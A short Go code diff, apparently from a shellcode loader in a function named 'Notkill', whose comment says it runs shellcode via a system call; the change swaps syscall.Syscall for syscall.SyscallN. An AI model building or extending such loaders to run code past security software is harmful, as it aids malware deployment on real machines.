@@ -46,5 +46,5 @@ func Notkill() {
 	checkErr(err)
 
 	//syscall来运行shellcode
-	syscall.Syscall(addr, 0, 0, 0, 0)
+	syscall.SyscallN(addr, 0, 0, 0, 0)
 }
